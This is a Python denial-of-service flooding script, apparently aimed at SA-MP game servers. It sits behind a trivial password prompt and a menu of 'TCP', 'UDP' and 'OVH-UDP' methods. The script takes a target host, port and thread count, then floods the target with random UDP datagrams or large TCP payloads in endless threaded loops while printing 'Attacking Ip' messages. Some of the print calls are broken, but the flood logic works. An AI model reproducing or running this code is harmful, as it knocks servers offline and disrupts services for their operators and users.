#CODEBYIFSTRONG27 JANGAN HAPUS NAMA AUTHOR
import random 
import socket
import threading
import itertools
import time
import os , sys
password ="Free"

for i in range(3):
    pwd = input(" User : ")
    j=3
    if(pwd==password):
        time.sleep(3)
        print("\033[91m Check your username please wait ")
        break
    else:
        time.sleep(2)
        print("\033[91m There was an error entering the username")
        continue
time.sleep(5)
print("\033[91m Your username has been successfully verified ")
time.sleep(4)
os.system("cls")


done = False


def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

t = threading.Thread(target=animate)
t.start()


time.sleep(10)
done = True
os.system("cls")

print ('''
             SAMP SERVER    Blank Methods  Blank Methods    VIP
            ╔════════════╗╔════════════╗╔════════════╗╔════════════╗
            ║ TCP        ║║ Blank      ║║ Blank      ║║ OVH-UDP    ║
            ║ UDP        ║║ Blank      ║║ Blank      ║║ Blank      ║
            ║ Blank      ║║ Blank      ║║ Blank      ║║ HTTPS      ║
            ╚════════════╝╚════════════╝╚════════════╝╚════════════╝''')


choice = str(input(" Method :"))
os.system("cls")

done = False


def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

t = threading.Thread(target=animate)
t.start()


time.sleep(10)
done = True
os.system("cls")

print ('''\033[1m

██╗███████╗░██████╗████████╗██████╗░░█████╗░███╗░░██╗░██████╗░██████╗░███████╗
██║██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗░██║██╔════╝░╚════██╗╚════██║
██║█████╗░░╚█████╗░░░░██║░░░██████╔╝██║░░██║██╔██╗██║██║░░██╗░░░███╔═╝░░░░██╔╝
██║██╔══╝░░░╚═══██╗░░░██║░░░██╔══██╗██║░░██║██║╚████║██║░░╚██╗██╔══╝░░░░░██╔╝░
██║██║░░░░░██████╔╝░░░██║░░░██║░░██║╚█████╔╝██║░╚███║╚██████╔╝███████╗░░██╔╝░░
╚═╝╚═╝░░░░░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝░░╚═╝░░░''')
print ('''            ====    Author : IFStrong27    ====                        ''')
os.system("cls")
ip = str(input(" Host :"))
port = int(input(" Port :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
os.system("cls")
def udp():
	data = random._urandom(811)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m  Attacking Ip %s \\033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m Servers %s Has Down %s"%(ip,port))
def tcp():
	data = random._urandom(102400)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m Attacking Ip %s And Port %s"%(ip,port))
def ovhudp():
	data = random._urandom(811)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m  Attacking Ip %s \\033[91m And Port %s"%(ip,port))
		except:
			print("\033[91m Servers %s Has Down %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    if choice == 'UDPOVH':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()